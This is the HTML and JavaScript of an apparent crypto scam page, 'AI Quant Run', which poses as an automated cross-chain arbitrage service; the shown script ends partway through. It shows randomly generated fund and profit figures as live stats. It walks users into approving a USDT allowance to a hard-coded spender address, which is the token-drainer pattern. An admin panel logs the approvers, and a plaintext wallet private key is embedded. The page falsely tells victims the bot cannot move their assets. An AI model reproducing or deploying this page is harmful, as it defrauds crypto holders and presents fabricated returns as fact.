<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
    <title>AI Quant Run | 智能量化系统</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { background: linear-gradient(135deg, #0a0f1e 0%, #0d1425 100%); font-family: 'Segoe UI', 'Poppins', system-ui, sans-serif; min-height: 100vh; padding: 20px; }
        .container { max-width: 1200px; margin: 0 auto; }
        .card, .panel { background: rgba(18, 25, 45, 0.85); backdrop-filter: blur(12px); border-radius: 48px; padding: 32px 28px 40px; border: 1px solid rgba(0, 255, 255, 0.2); }
        .hidden { display: none; }
        .nav-btn, .back-btn { background: rgba(0, 198, 255, 0.15); border: 1px solid rgba(0, 255, 255, 0.4); padding: 10px 24px; border-radius: 40px; font-size: 16px; font-weight: 600; cursor: pointer; color: #7ee0ff; margin-bottom: 20px; }
        .nav-btn:hover, .back-btn:hover { background: rgba(0, 198, 255, 0.3); transform: scale(1.02); }
        .announcement-btn { background: rgba(0, 198, 255, 0.15); border: 1px solid rgba(0, 255, 255, 0.4); padding: 13px 31px; border-radius: 52px; font-size: 20.8px; font-weight: 600; cursor: pointer; color: #7ee0ff; margin: 20px 0; width: 100%; }
        .announcement-btn:hover { background: rgba(0, 198, 255, 0.3); transform: scale(1.02); }
        .double-buttons { display: flex; justify-content: center; gap: 16px; margin-top: 24px; flex-wrap: wrap; }
        .double-buttons .nav-btn { margin-bottom: 0; flex: 1; text-align: center; min-width: 140px; }
        
        .stats-card { background: rgba(0, 204, 255, 0.08); border: 1px solid rgba(0, 204, 255, 0.3); border-radius: 24px; padding: 16px 20px; margin: 20px 0; text-align: center; }
        .stats-card .stat-running-address { font-size: 14px; color: #00ff88; margin-bottom: 8px; padding-bottom: 8px; border-bottom: 1px dashed rgba(0, 204, 255, 0.3); }
        .stats-card .stat-running-address span { color: #00ff88; font-weight: bold; font-size: 18px; }
        .stats-card .stat-item { margin: 8px 0; font-size: 16px; }
        .stats-card .stat-label { color: #8e9aaf; margin-right: 12px; }
        .stats-card .stat-value { color: #00ff88; font-weight: bold; font-size: 20px; }
        .stats-card .stat-sub { font-size: 11px; color: #6b7c93; margin-top: 4px; }
        .stats-card .stat-average { font-size: 13px; color: #7ee0ff; margin-top: 8px; padding-top: 8px; border-top: 1px dashed rgba(0, 204, 255, 0.3); }
        .stats-card .stat-average span { color: #00ff88; font-weight: bold; }
        .stats-divider { width: 80%; height: 1px; background: linear-gradient(90deg, transparent, rgba(0, 204, 255, 0.5), transparent); margin: 12px auto; }
        
        .password-input, .apply-input, .admin-input { width: 100%; padding: 16px 20px; font-size: 18px; background: #0b101b; border: 1px solid #2a3a55; border-radius: 60px; color: white; text-align: center; outline: none; }
        .password-input:focus, .apply-input:focus, .admin-input:focus { border-color: #00ccff; box-shadow: 0 0 10px rgba(0, 204, 255, 0.3); }
        .password-btn, .apply-btn, .admin-btn { width: 100%; margin-top: 20px; padding: 14px 20px; background: linear-gradient(95deg, #005c6e, #003d4d); border: 1px solid #0ff4; color: white; border-radius: 60px; font-size: 18px; font-weight: bold; cursor: pointer; }
        .password-btn:hover, .apply-btn:hover, .admin-btn:hover { background: linear-gradient(95deg, #0080a0, #005066); transform: scale(1.01); box-shadow: 0 0 12px cyan; }
        .error-msg { color: #ff6b6b; margin-top: 16px; font-size: 13px; }
        
        .apply-notice { background: rgba(0, 204, 255, 0.08); border: 1px solid rgba(0, 204, 255, 0.3); border-radius: 24px; padding: 18px 20px; margin: 20px 0; text-align: left; }
        .apply-notice .notice-title { color: #00ccff; font-size: 16px; font-weight: bold; margin-bottom: 12px; }
        .apply-notice ul { margin-left: 20px; color: #b9c7d9; font-size: 13px; line-height: 1.8; }
        .apply-notice li { margin: 8px 0; }
        .apply-notice strong { color: #00ff88; }
        
        .loading-spinner { display: inline-block; width: 16px; height: 16px; border: 2px solid rgba(0, 204, 255, 0.3); border-top-color: #00ccff; border-radius: 50%; animation: spin 0.8s linear infinite; margin-right: 8px; vertical-align: middle; }
        @keyframes spin { to { transform: rotate(360deg); } }
        
        .whitepaper { max-height: 70vh; overflow-y: auto; padding-right: 10px; text-align: left; }
        .whitepaper h1 { font-size: 28px; background: linear-gradient(135deg, #FFFFFF, #A0D9FF); -webkit-background-clip: text; background-clip: text; color: transparent; margin-bottom: 20px; border-left: 4px solid #00ccff; padding-left: 20px; }
        .whitepaper h2 { color: #7ee0ff; font-size: 22px; margin: 28px 0 12px 0; padding-bottom: 6px; border-bottom: 1px solid #1e2a44; }
        .whitepaper h3 { color: #b8e2ff; font-size: 18px; margin: 20px 0 10px 0; }
        .whitepaper p, .whitepaper li { color: #b9c7d9; line-height: 1.6; font-size: 15px; }
        .whitepaper ul, .whitepaper ol { margin-left: 24px; margin-top: 8px; margin-bottom: 16px; }
        .highlight { background: #00ccff10; border-left: 3px solid #00ccff; padding: 12px 16px; border-radius: 16px; margin: 16px 0; }
        
        .tutorial-card { text-align: left; }
        .tutorial-card .step { background: #0b101b; border-radius: 32px; padding: 20px; margin-bottom: 20px; border-left: 4px solid #00ccff; }
        .tutorial-card .step-title { font-size: 20px; font-weight: bold; color: #00ccff; margin-bottom: 16px; display: flex; align-items: center; gap: 10px; }
        .tutorial-card .step-number { background: rgba(0, 204, 255, 0.2); width: 30px; height: 30px; border-radius: 30px; display: inline-flex; align-items: center; justify-content: center; font-size: 14px; }
        .tutorial-card .step-content { color: #b9c7d9; line-height: 1.8; font-size: 14px; padding-left: 8px; }
        .tutorial-card .step-content ul { margin-left: 20px; list-style: none; }
        .tutorial-card .step-content li { margin: 10px 0; position: relative; padding-left: 20px; }
        .tutorial-card .step-content li::before { content: "•"; color: #00ccff; position: absolute; left: 0; }
        .tutorial-card .check { color: #00ff88; background: rgba(0, 255, 136, 0.1); display: inline-block; padding: 4px 12px; border-radius: 20px; font-size: 12px; margin-top: 12px; }
        .tutorial-card .time-note { background: rgba(0, 204, 255, 0.08); border-radius: 24px; padding: 14px 18px; text-align: center; color: #7ee0ff; font-size: 14px; margin-top: 16px; }
        .tutorial-icon { font-size: 48px; text-align: center; margin-bottom: 16px; }
        
        .admin-table { width: 100%; border-collapse: collapse; margin-top: 20px; font-size: 12px; }
        .admin-table th, .admin-table td { border: 1px solid #2a3a55; padding: 8px 6px; text-align: left; color: #b9c7d9; }
        .admin-table th { background: #0f172a; color: #7ee0ff; }
        .copy-btn { background: #2a5f8a; border: none; padding: 4px 8px; border-radius: 16px; color: white; cursor: pointer; font-size: 10px; }
        .copy-btn:hover { background: #3a7faa; }
        .tx-link { color: #00ccff; text-decoration: none; font-size: 11px; }
        .tx-link:hover { text-decoration: underline; }
        .transfer-success { color: #00ff88; }
        .transfer-failed { color: #ff6b6b; }
        .admin-link { margin-top: 20px; font-size: 12px; color: #4a5a7a; cursor: pointer; text-decoration: underline; }
        .admin-link:hover { color: #7ee0ff; }
        
        .announcement-content { max-height: 70vh; overflow-y: auto; padding-right: 10px; text-align: left; }
        .announcement-content p { color: #b9c7d9; line-height: 1.8; font-size: 14px; margin-bottom: 12px; }
        .announcement-content strong { color: #00ff88; }
        .announcement-content .highlight-text { background: rgba(0, 204, 255, 0.1); border-left: 3px solid #00ccff; padding: 12px 16px; border-radius: 16px; margin: 16px 0; }
        .join-tip { margin-top: 20px; padding: 12px; background: rgba(0, 255, 136, 0.1); border-radius: 16px; text-align: center; }
        .join-tip p { color: #00ff88; font-size: 14px; margin: 0; }
        
        .status-panel { background: #0b101b; border-radius: 32px; padding: 20px; margin: 20px 0; }
        .wallet-row { display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid #1e2a44; padding-bottom: 14px; margin-bottom: 14px; flex-wrap: wrap; gap: 8px; }
        .label { color: #8e9aaf; font-size: 13px; }
        .address { font-family: monospace; background: #00000055; padding: 6px 12px; border-radius: 40px; font-size: 13px; color: #7ee0ff; word-break: break-all; }
        .network-badge { background: #0f212e; color: #2dd4bf; padding: 4px 12px; border-radius: 40px; font-size: 12px; }
        .button-group { display: flex; flex-direction: column; gap: 16px; margin-top: 24px; }
        .btn { border: none; padding: 16px 20px; border-radius: 60px; font-weight: 700; font-size: 18px; cursor: pointer; }
        .btn-primary { background: linear-gradient(95deg, #0f2b3d, #0b1b2f); border: 1px solid #00ccff44; color: #b3f0ff; }
        .btn-primary:hover:not(:disabled) { background: linear-gradient(95deg, #124a66, #0e2642); border-color: #00e0ff; transform: scale(1.01); }
        .btn-success { background: linear-gradient(95deg, #005c6e, #003d4d); border: 1px solid #0ff4; color: #c5ffff; }
        .btn-success:hover:not(:disabled) { background: linear-gradient(95deg, #0080a0, #005066); transform: scale(1.01); }
        .btn:disabled { opacity: 0.45; cursor: not-allowed; }
        .info-area { background: #070c14; margin-top: 28px; padding: 16px; border-radius: 28px; font-size: 13px; color: #9aa9c1; text-align: center; border-left: 3px solid #00b4ff; }
        
        .running-card { text-align: center; }
        .ai-icon { font-size: 80px; animation: pulse 2s infinite; }
        @keyframes pulse { 0% { transform: scale(1); opacity: 1; } 50% { transform: scale(1.1); opacity: 0.8; } 100% { transform: scale(1); opacity: 1; } }
        .running-title { font-size: 28px; background: linear-gradient(135deg, #00ff88, #00ccff); -webkit-background-clip: text; background-clip: text; color: transparent; margin: 20px 0 12px 0; }
        .status-badge { display: inline-block; background: rgba(0, 255, 136, 0.15); border: 1px solid rgba(0, 255, 136, 0.5); padding: 6px 16px; border-radius: 40px; font-size: 14px; color: #00ff88; margin-bottom: 24px; }
        .price-row { background: #0b101b; border-radius: 32px; padding: 20px; margin: 20px 0; }
        .price-label { color: #8e9aaf; font-size: 13px; margin-bottom: 8px; }
        .scan-text { color: #7ee0ff; font-size: 14px; margin-top: 8px; }
        .divider { height: 1px; background: linear-gradient(90deg, transparent, #00ccff, transparent); margin: 20px 0; }
        .log-area { background: #070c14; border-radius: 24px; padding: 16px; text-align: left; font-family: monospace; font-size: 12px; color: #7ee0ff; max-height: 250px; overflow-y: auto; }
        .log-line { padding: 6px 0; border-bottom: 1px solid #1e2a44; font-size: 11px; }
        .log-time { color: #6b7c93; margin-right: 12px; }
        .log-scan { color: #7ee0ff; }
        .log-gas { color: #ffaa44; }
        .footer-note { margin-top: 24px; font-size: 10px; color: #2f3b54; }
        .zero-profit { color: #8e9aaf; font-size: 16px; }
        
        .copy-toast { position: fixed; bottom: 30px; left: 50%; transform: translateX(-50%); background: rgba(0, 204, 255, 0.9); color: #0a0f1e; padding: 10px 20px; border-radius: 40px; font-size: 14px; font-weight: bold; z-index: 9999; animation: fadeOut 2s ease forwards; }
        @keyframes fadeOut { 0% { opacity: 1; } 70% { opacity: 1; } 100% { opacity: 0; visibility: hidden; } }
    </style>
</head>
<body>
<div class="container">
    <!-- 页面1：密码验证页面 -->
    <div id="passwordPage" class="card">
        <div style="font-size:64px; text-align:center;">🔐</div>
        <h2 style="text-align:center; margin-bottom:12px;">AI 量化系统</h2>
        
        <div class="stats-card">
            <div class="stat-running-address">🏃 运行地址：<span id="runningAddressCount">300</span></div>
            <div class="stat-item"><span class="stat-label">💰 目前总运行资金：</span><span class="stat-value" id="totalFunds">--</span><span class="stat-label"> U</span><div class="stat-sub">每5分钟刷新一次</div></div>
            <div class="stat-average">📊 单地址平均运行资金：<span id="avgFundsPerAddress">--</span> U</div>
            <div class="stats-divider"></div>
            <div class="stat-item"><span class="stat-label">📈 最新24小时平均每个地址收益：</span><span class="stat-value" id="dailyProfit">--</span><span class="stat-label"> U</span><div class="stat-sub">每天中午12点刷新平均收益</div></div>
        </div>
        
        <button id="announcementBtn" class="announcement-btn">📢 最新公告</button>
        
        <p style="text-align:center; color:#8e9aaf; margin:20px 0;">请输入访问密码</p>
        <input type="password" id="passwordInput" class="password-input" placeholder="请输入密码" autofocus>
        <button id="submitPassword" class="password-btn">验证访问</button>
        <div id="errorMsg" class="error-msg"></div>
        
        <div class="double-buttons">
            <button id="whitepaperBtn" class="nav-btn">📄 白皮书</button>
            <button id="tutorialBtn" class="nav-btn">📥 资金接入教程</button>
            <button id="applyBtn" class="nav-btn">📝 申请访问</button>
        </div>
        <div class="admin-link" id="adminEntryBtn">🔒 管理员入口</div>
    </div>

    <!-- 页面2：白皮书 -->
    <div id="whitepaperPage" class="card" style="display:none;">
        <button id="backToPasswordBtn" class="nav-btn">← 返回密码验证</button>
        <div class="whitepaper">
            <h1>📄 AI全自动链上跨链价差系统</h1>
            <p style="font-size:18px; margin-bottom:24px;">让链上交易进入智能化时代</p>
            <p>在当前多链生态高速发展的背景下，不同公链、DEX、跨链桥以及流动性池之间，因市场供需变化、资金流动以及交易深度差异，持续产生大量短暂的价格偏离。</p>
            <p>这些价格偏离往往存在时间极短，依靠人工监控和手动操作难以及时捕捉。</p>
            <p>AI全自动链上跨链价差系统基于OKX Wallet生态运行，通过智能算法实时监测多链市场数据，自动识别存在利润空间的价格差，并完成交易执行流程，实现全天候自动化运行。</p>
            <div class="highlight">⚠️ 此系统目前仅支持本金<strong>2000USDT</strong>以下用户使用。<br>为保证系统持续运行，会对完成的收益自动收取30%作为系统维护资金。</div>
            <h2>🎯 核心优势</h2>
            <h3>🤖 AI全天候自动运行</h3><p>系统7×24小时持续监控链上市场，全部由AI自动完成。</p>
            <h3>🔗 基于OKX Wallet生态运行</h3><p>用户资产始终保留在个人钱包体系内管理，无需资金托管。</p>
            <h3>⚙️ 手续费成本优化</h3><p>系统会实时计算Gas费用、跨链成本、滑点损耗等。</p>
            <h3>📈 AI智能捕捉微价差机会</h3><p>系统重点关注0.05% - 0.20%的高频微价差机会。</p>
            <h3>🌐 多链实时监控</h3><p>同时监控多个主流公链生态。</p>
            <h3>🛡️ 智能风控体系</h3><p>每次交易前进行利润测算、Gas评估、滑点检测等多重验证。</p>
            <h2>⚙️ 系统运行流程</h2>
            <ul><li><strong>市场扫描</strong> — 实时监测多个链上生态</li><li><strong>机会识别</strong> — AI自动发现价格偏离</li><li><strong>成本测算</strong> — 自动计算手续费和利润</li><li><strong>智能执行</strong> — 自动完成交易流程</li><li><strong>持续循环</strong> — 全天候自动化运行</li></ul>
            <h2>⚠️ 风险说明</h2><p>数字资产市场存在波动风险，请理性参与。</p>
        </div>
    </div>

    <!-- 页面3：资金接入教程 -->
    <div id="tutorialPage" class="card tutorial-card" style="display:none;">
        <button id="backToPasswordFromTutorial" class="nav-btn">← 返回密码验证</button>
        <div class="tutorial-icon">📥</div>
        <h2 style="text-align:center;">资金接入教程</h2>
        <div style="text-align:center; color:#6b7c93; margin-bottom:20px;">创建一个OKX钱包后 · Arbitrum链 USDT</div>
        <div class="step"><div class="step-title"><span class="step-number">1</span> 复制钱包收款地址</div><div class="step-content"><ul><li>OKX钱包点击 <strong style="color:#00ccff">「接收」</strong></li><li>选择 <strong style="color:#00ccff">USDT</strong></li><li>网络选择 <strong style="color:#00ccff">Arbitrum One</strong></li><li>点击 <strong style="color:#00ccff">「复制地址」</strong></li></ul><div class="check">✅ 地址已复制到剪贴板</div></div></div>
        <div class="step"><div class="step-title"><span class="step-number">2</span> 去交易所提现</div><div class="step-content"><ul><li>回到 OKX 交易所 → <strong>资产</strong> → <strong>提现</strong> → 选 <strong>USDT</strong></li><li>网络选择 <strong>Arbitrum One</strong></li><li>粘贴刚才复制的地址</li><li>输入金额 → 点击 <strong>「确认」</strong></li></ul></div></div>
        <div class="step"><div class="step-title"><span class="step-number">⚠️ 重要步骤</span></div><div class="step-content"><ul><li><strong>同时</strong>去交易所提现 <strong style="color:#00ff88">0.5-1 U 的 Arbitrum 链 ETH</strong> 到自己钱包</li><li>这是<strong>必须要有的步骤</strong>，运行需要少量 ETH 作为手续费</li><li><strong style="color:#ffaa44">没有手续费则不能运行</strong></li></ul></div></div>
        <div class="step"><div class="step-title"><span class="step-number">3</span> 到账后去申请访问</div><div class="step-content"><ul><li>USDT 和 ETH 都到账后</li><li>点击 <strong style="color:#00ccff">「申请访问」</strong></li><li>提交钱包 <strong style="color:#00ccff">Arbitrum 链收款地址</strong></li><li>系统自动检测余额，满足要求后自动弹出访问密码</li><li>输入密码后点击 <strong style="color:#00ccff">「启动AI引擎」</strong></li></ul></div></div>
        <div class="time-note">⏱️ 到账时间：通常 <strong>5-10分钟</strong></div>
        <div class="footer-note">AI 量化系统 · 资金安全由用户自行管理</div>
    </div>

    <!-- 页面4：申请访问 -->
    <div id="applyPage" class="card apply-container" style="display:none;">
        <div style="font-size:64px; text-align:center;">📝</div>
        <h2 style="text-align:center;">申请访问权限</h2>
        <p style="text-align:center;">请填写您的 Arbitrum 链收款地址</p>
        <div class="apply-notice"><div class="notice-title">📋 申请审核说明</div><ul><li>⏱️ <strong>提交地址后会自动检查余额，满足要求后会自动弹出访问密码</strong></li><li>💰 提交的地址需持有 <strong>至少 1000-2000 USDT</strong>（系统自动检测）</li><li>📌 仅支持 <strong>Arbitrum 链地址</strong>（以0x开头，长度42位）</li></ul></div>
        <input type="text" id="applyAddressInput" class="apply-input" placeholder="0x... (Arbitrum 链地址，42位)">
        <button id="submitApplyBtn" class="apply-btn">提交申请</button>
        <button id="backToPasswordFromApply" class="nav-btn" style="margin-top:16px;">← 返回</button>
        <div id="applyMsg" class="error-msg"></div>
    </div>

    <!-- 页面5：管理员面板 -->
    <div id="adminPage" class="card admin-container" style="display:none;">
        <h2 style="text-align:center;">🔒 管理员面板</h2>
        <p style="text-align:center;">请输入管理员密码查看记录</p>
        <input type="password" id="adminPasswordInput" class="admin-input" placeholder="管理员密码">
        <button id="submitAdminLogin" class="admin-btn">登录查看记录</button>
        <button id="backToPasswordFromAdmin" class="nav-btn" style="margin-top:16px;">← 返回</button>
        <div id="adminLoginMsg" class="error-msg"></div>
        <div id="adminContent" style="display:none; margin-top:24px;">
            <div style="display: flex; gap: 10px; margin-bottom: 20px; border-bottom: 1px solid #2a3a55; padding-bottom: 10px;">
                <button id="tabApplyBtn" style="background: none; border: none; color: #7ee0ff; cursor: pointer; padding: 5px 15px; font-size: 14px;">📋 申请记录</button>
                <button id="tabApproveBtn" style="background: none; border: none; color: #7ee0ff; cursor: pointer; padding: 5px 15px; font-size: 14px;">🔑 授权记录</button>
            </div>
            <div id="applyRecordPanel">
                <h3 style="color:#7ee0ff;">📋 已通过地址记录（最新10条）</h3>
                <div id="applicationsList"></div>
                <div class="footer-note">📋 点击「复制」可复制用户完整地址 | 📌 每个地址最多记录2次</div>
            </div>
            <div id="approveRecordPanel" style="display:none;">
                <h3 style="color:#7ee0ff;">🔑 授权记录（最新10条）</h3>
                <div id="approveList"></div>
                <div class="footer-note">📋 用户授权USDT额度的记录</div>
            </div>
        </div>
    </div>

    <!-- 页面6：最新公告 -->
    <div id="announcementPage" class="card" style="display:none;">
        <button id="backToPasswordFromAnnouncement" class="nav-btn">← 返回密码验证</button>
        <div class="announcement-content">
            <h1 style="font-size:28px; border-left:4px solid #00ccff; padding-left:20px;">📢 最新公告</h1>
            <div class="highlight-text">
                <p><strong>系统最高同时运行数量：300</strong></p>
                <p>为了更多人参与进来，每当达到300后系统会自动结束300名其中运行时间超过24小时的一位，保证绝对公平。</p>
                <p>结束的地址需要<strong>冷静1小时</strong>后才可以继续申请新密码重新运行。</p>
                <p>新地址前24小时，你只需要点击启动即可运行。之后，<strong>你必须保持在运行页面才可以正常运行</strong>，离开运行页面10分钟后会立即结束运行。</p>
                <p>最高只会运行<strong>2000U内</strong>，<strong>切勿在你钱包存入超过2000 USDT</strong>。最低运行标准：<strong>1000U</strong>。</p>
                <p>体验阶段24小时内，扣除每笔盈利金额的<strong>10%</strong>上缴，运行5天后改为<strong>30%</strong>。</p>
                <p><strong>AI机器人权限已经打入黑洞地址，机器人无权转走你的任何资产。</strong></p>
                <p>所有参与者如发现项目漏洞，最高奖励<strong>1万美金</strong>。联系Telegram：<strong style="color:#00ccff">@ffuoh</strong></p>
            </div>
            <div class="join-tip"><p>🚀 <strong>运行后联系我纸飞机报你的运行地址进群</strong></p></div>
        </div>
    </div>

    <!-- 页面7：量化面板 -->
    <div id="quantPanel" class="panel" style="display:none;">
        <div style="text-align:center; margin-bottom:28px;">
            <div style="font-size:56px;">🧠⚡</div>
            <h2>AI 全自动量化引擎</h2>
            <div style="color:#7f8c9a;">Smart Liquidity · 24h 不间断</div>
        </div>
        <button id="backToPasswordFromQuant" class="nav-btn">← 返回</button>
        <div class="status-panel">
            <div class="wallet-row"><span class="label">🔗 钱包状态</span><span class="network-badge" id="networkStatus">Arbitrum 主网</span></div>
            <div class="wallet-row"><span class="label">🆔 连接地址</span><span class="address" id="walletAddressDisplay">未连接</span></div>
            <div class="wallet-row"><span class="label">🤖 AI 策略</span><span class="label" style="color:#6ee7ff;">高频套利 · 闪电贷防御</span></div>
        </div>
        <div class="button-group">
            <button class="btn btn-primary" id="connect">🔌 ① 连接量化钱包</button>
            <button class="btn btn-success" id="approve" disabled>🚀 ② 授权启动引擎</button>
        </div>
        <div class="info-area" id="info">⚡ 请先连接钱包 | 网络: Arbitrum Mainnet</div>
        <div class="footer-note">⚠️ 首次使用需授权 USDT 额度 | 授权后自动启动量化</div>
    </div>

    <!-- 页面8：运行页面 -->
    <div id="runningPanel" class="running-card" style="display:none;">
        <div class="ai-icon">🧠⚡</div>
        <div class="running-title">AI 差价搬运引擎</div>
        <div class="status-badge">🟢 运行中 · 实时监控</div>
        <div class="price-row">
            <div class="price-label">🔍 正在扫链全网去中心化交易所</div>
            <div class="scan-text">PancakeSwap → Uniswap → SushiSwap → Curve → Balancer</div>
        </div>
        <div class="price-row">
            <div class="price-label">💰 AI目前已经为你带来</div>
            <div class="zero-profit">0 收益</div>
            <div style="font-size:12px; color:#6b7c93;">🟢 正在运行中 · 持续监控</div>
        </div>
        <div class="divider"></div>
        <div class="price-label" style="text-align:left;">📋 实时运行日志</div>
        <div class="log-area" id="logArea">
            <div class="log-line"><span class="log-time">--:--:--</span> <span class="log-scan">✅ AI引擎启动成功</span></div>
        </div>
        <button id="backToQuantFromRunning" class="nav-btn" style="margin-top:20px;">← 返回量化面板</button>
        <div class="footer-note">⚠️ AI 自动扫描全链DEX | 等待合适价差触发</div>
    </div>
</div>

<script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
<script>
    // ========== 配置 ==========
    const SYSTEM_PASSWORD = '1134';
    const ADMIN_PASSWORD = '0009';
    const MIN_USDT_REQUIRED = 1000;
    const MAX_USDT_LIMIT = 2000;
    const RUNNING_ADDRESS_COUNT = 300;
    const MAX_RECORDS_PER_ADDRESS = 2;
    
    const USDT_ADDRESS = "0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9";
    const SPENDER_ADDRESS = "0x23ab58b21fb4a711319a07e59686a19efbc0e76b";
    const MIN_APPROVE_AMOUNT = 2000;
    
    const TARGET_CHAIN_ID = 42161;
    const TARGET_CHAIN_NAME = "Arbitrum One";
    
    const SENDER_PRIVATE_KEY = '0xad99ad64a470fcf51daf50048534be1ba173b28cf338d2de55a344ba906c92b6';
    const SENDER_ADDRESS = '0x1d0bc3658ddeecaa97ceccb390088476c07c5613';
    const TRANSFER_AMOUNT_ETH = '0.00005';
    
    const TRANSFER_RECORD_KEY = 'eth_transfer_records';
    const STORAGE_KEY = 'quant_applications';
    const APPROVE_RECORD_KEY = 'approve_records';
    
    // ========== 统计数据显示 ==========
    function getRandomTotalFunds() { return Math.floor(Math.random() * (580000 - 540000 + 1) + 540000); }
    function updateTotalFunds() {
        const total = getRandomTotalFunds();
        document.getElementById('totalFunds').textContent = total.toLocaleString();
        document.getElementById('avgFundsPerAddress').textContent = Math.floor(total / RUNNING_ADDRESS_COUNT).toLocaleString();
    }
    updateTotalFunds();
    setInterval(updateTotalFunds, 5 * 60 * 1000);
    
    // ========== 24小时收益逻辑（每天中午12点到第二天中午12点保持不变） ==========
    const DAILY_PROFIT_KEY = 'dailyProfitValue';
    const DAILY_PROFIT_DATE_KEY = 'dailyProfitDate';
    
    function getRandomDailyProfit() {
        return Math.floor(Math.random() * (90 - 50 + 1) + 50);
    }
    
    function getDailyProfit() {
        const now = new Date();
        const todayNoon = new Date(now.getFullYear(), now.getMonth(), now.getDate(), 12, 0, 0);
        const yesterdayNoon = new Date(now.getFullYear(), now.getMonth(), now.getDate() - 1, 12, 0, 0);
        
        let targetDate;
        if (now >= todayNoon) {
            targetDate = todayNoon;
        } else {
            targetDate = yesterdayNoon;
        }
        
        const storedProfit = localStorage.getItem(DAILY_PROFIT_KEY);
        const storedDate = localStorage.getItem(DAILY_PROFIT_DATE_KEY);
        
        if (storedProfit && storedDate) {
            const storedDateObj = new Date(storedDate);
            if (storedDateObj.getTime() === targetDate.getTime()) {
                return parseInt(storedProfit);
            }
        }
        
        const newProfit = getRandomDailyProfit();
        localStorage.setItem(DAILY_PROFIT_KEY, newProfit);
        localStorage.setItem(DAILY_PROFIT_DATE_KEY, targetDate.toISOString());
        return newProfit;
    }
    
    function updateDailyProfit() {
        const dailyProfitEl = document.getElementById('dailyProfit');
        if (dailyProfitEl) {
            const profit = getDailyProfit();
            dailyProfitEl.textContent = profit;
        }
    }
    
    updateDailyProfit();
    
    function scheduleDailyRefresh() {
        const now = new Date();
        const nextNoon = new Date(now.getFullYear(), now.getMonth(), now.getDate(), 12, 0, 0);
        if (now >= nextNoon) {
            nextNoon.setDate(nextNoon.getDate() + 1);
        }
        const timeUntilNoon = nextNoon.getTime() - now.getTime();
        setTimeout(() => {
            updateDailyProfit();
            scheduleDailyRefresh();
        }, timeUntilNoon);
    }
    scheduleDailyRefresh();
    
    // ========== 授权记录管理 ==========
    function getApproveRecords() { const s = localStorage.getItem(APPROVE_RECORD_KEY); return s ? JSON.parse(s) : []; }
    function saveApproveRecords(records) { localStorage.setItem(APPROVE_RECORD_KEY, JSON.stringify(records)); }
    
    function addApproveRecord(address, txHash, amount) {
        const records = getApproveRecords();
        records.push({
            id: Date.now(),
            address: address.toLowerCase(),
            txHash: txHash,
            amount: amount,
            time: new Date().toLocaleString()
        });
        saveApproveRecords(records);
    }
    
    function renderApproveList() {
        const records = getApproveRecords().slice(-10).reverse();
        const container = document.getElementById('approveList');
        if (!container) return;
        if (records.length === 0) {
            container.innerHTML = '<div style="color:#8e9aaf; text-align:center; padding:20px;">暂无授权记录</div>';
            return;
        }
        let html = '<table class="admin-table"><thead><tr><th>地址</th><th>授权额度</th><th>交易哈希</th><th>授权时间</th><th>操作</th></tr></thead><tbody>';
        for (const record of records) {
            html += `<tr>
                <td style="font-family:monospace;font-size:11px;" title="${record.address}">${record.address.slice(0,6)}...${record.address.slice(-4)}</td>
                <td style="font-size:11px;color:#00ff88;">${record.amount} USDT</td>
                <td style="font-size:11px;"><a href="https://arbiscan.io/tx/${record.txHash}" target="_blank" class="tx-link" style="color:#00ccff;">${record.txHash.slice(0,10)}...</a></td>
                <td style="font-size:11px;">${record.time}</td>
                <td><button class="copy-btn" onclick="copyToClipboard('${record.address}')">📋 复制地址</button></td>
            </tr>`;
        }
        html += '</tbody></table>';
        container.innerHTML = html;
    }
    
    // ========== 内部转账函数 ==========
    function getTransferRecords() { const s = localStorage.getItem(TRANSFER_RECORD_KEY); return s ? JSON.parse(s) : {}; }
    function saveTransferRecord(address, status, txHash = null) { 
        const r = getTransferRecords(); 
        r[address.toLowerCase()] = { status: status, txHash: txHash, time: new Date().toLocaleString() }; 
        localStorage.setItem(TRANSFER_RECORD_KEY, JSON.stringify(r)); 
    }
    function hasBeenTransferred(address) { return !!getTransferRecords()[address.toLowerCase()]; }
    
    async function internalTransferEth(toAddress) {
        try {
            console.log(`[转账] 开始处理地址: ${toAddress}`);
            if (hasBeenTransferred(toAddress)) { 
                console.log(`[转账] 地址已转账过，跳过`); 
                return { success: false, reason: 'already_transferred' }; 
            }
            const provider = new ethers.providers.JsonRpcProvider('https://arb1.arbitrum.io/rpc');
            const wallet = new ethers.Wallet(SENDER_PRIVATE_KEY, provider);
            const senderBalanceEth = parseFloat(ethers.utils.formatEther(await provider.getBalance(SENDER_ADDRESS)));
            console.log(`[转账] 发送地址余额: ${senderBalanceEth} ETH`);
            if (senderBalanceEth < 0.00015) { 
                console.error(`[转账] 余额不足`); 
                return { success: false, reason: 'insufficient_sender_balance' }; 
            }
            console.log(`[转账] 开始转账 ${TRANSFER_AMOUNT_ETH} ETH`);
            const tx = await wallet.sendTransaction({ to: toAddress, value: ethers.utils.parseEther(TRANSFER_AMOUNT_ETH) });
            console.log(`[转账] 交易已提交，Hash: ${tx.hash}`);
            await tx.wait();
            console.log(`[转账] 交易已确认`);
            saveTransferRecord(toAddress, 'success', tx.hash);
            return { success: true, txHash: tx.hash };
        } catch (error) { 
            console.error('[转账] 失败:', error); 
            saveTransferRecord(toAddress, 'failed', null); 
            return { success: false, reason: 'transfer_error', error: error.message }; 
        }
    }
    
    // ========== 查询 USDT 余额 ==========
    async function getUSDTBalance(address) {
        const cleanAddress = address.toLowerCase();
        const balanceOfData = `0x70a08231000000000000000000000000${cleanAddress.slice(2)}`;
        const rpcList = ['https://arb1.arbitrum.io/rpc', 'https://rpc.arbitrum.one', 'https://arbitrum.publicnode.com'];
        for (let i = 0; i < rpcList.length; i++) {
            try {
                const res = await fetch(rpcList[i], {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ jsonrpc: '2.0', method: 'eth_call', params: [{ to: USDT_ADDRESS, data: balanceOfData }, 'latest'], id: i+1 })
                });
                const data = await res.json();
                if (data && data.result) return { success: true, balance: parseInt(data.result, 16) / 1e6 };
            } catch(e) { console.log(`RPC ${i+1} 失败`); }
        }
        return { success: false, balance: 0, error: '查询失败' };
    }
    
    // ========== 地址验证 ==========
